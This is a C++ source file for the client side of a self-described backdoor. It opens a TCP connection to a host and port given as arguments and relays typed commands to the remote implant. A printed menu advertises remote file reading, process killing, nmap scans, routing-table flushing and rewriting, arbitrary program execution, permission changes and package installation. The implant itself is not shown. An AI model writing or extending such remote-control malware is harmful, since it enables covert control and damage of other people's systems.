#include "BDClient.h"


int main(int argc, char* argv[])
{ 
	cout << "Welcome to the cool Backdoor client...\n";
	int sockfd, n;
	struct sockaddr_in serv_addr;
	struct hostent *server;
	size_t bufferSize = 1024;
	size_t amountRead;

	char *buffer;

	buffer = (char *)malloc(bufferSize * sizeof(char)+ 1 * sizeof(char));

	printf("Configuration: ip = [%s], port = [%s]\n", argv[1], argv[2]);

	//create the socket
	//args: inet domain, stream sock, default protocol (tcp here)
	sockfd = socket(PF_INET, SOCK_STREAM, 0);

	if (sockfd < 0 ){
		printf("Oh No!!!!!\n");
	}
	
	server = gethostbyname(argv[1]);
	if(server == NULL){
		fprintf(stderr, "ERROR, no such host\n");
	}

	bzero((char *) &serv_addr, sizeof(serv_addr));
	serv_addr.sin_family = AF_INET;
	bcopy((char *)server->h_addr,
		(char *)&serv_addr.sin_addr.s_addr,
		server->h_length);
	serv_addr.sin_port = htons(stoi(argv[2]));
	if(connect(sockfd, (struct sockaddr*)&serv_addr, sizeof(serv_addr)) < 0){
		fprintf(stderr, "ERROR connecting\n");
	}

	n=read(sockfd, buffer, 1023);
	printf("%s\n", buffer);

	menu(); // print the menu to start
	
	printf("Enter command: ");
	amountRead = getline(&buffer, &bufferSize, stdin);
	
	while (strncmp("off", buffer, (int)strlen(buffer)-1) != 0){
        write(sockfd, buffer, amountRead);
		amountRead = getline(&buffer, &bufferSize, stdin);
	}
	
	write(sockfd, buffer, amountRead);
	
}

void menu()
{
	printf("Command listings:\n");
	printf("-----------------------------------------------\n");
	printf("pwd							- print working directory\n");
	printf("cd <dir>						- change directory to <dir>\n");
	printf("ls							- list the contents of the current working directory\n");
	printf("ll 							- (ls -FGlAihp) more detailed ls\n");
	printf("cat <file>						- return contents of <file>\n");
	printf("who							- list currently logged in users\n");
	printf("net							- show current network configuration\n");
	printf("ps							- show currently running processes\n");
	printf("kill -9 <pid> 						- kill process <pid>\n");
	printf("nmap <params>						- run nmap with <params>\n");
	printf("netstat -r 						- Display routing table\n");
	printf("route flush 						- flush routing tables\n");
	printf("route add -net <ipaddr> gw <gateway> 			- Add a route to the table through <ipaddr>, <gateway>\n");
	printf("ext <program> <params>					- run <program> with <parameters>\n");
	printf("chmod <permissions> <file>				- change <file> accessibility to <permissions>\n");
	printf("apt-get install <pkg> 					- Install <pkg>\n");
	printf("\n");
	printf("help							- print this list of commands\n");
	printf("off							- terminate the backdoor program\n");
	printf("-----------------------------------------------\n\n");
	
}
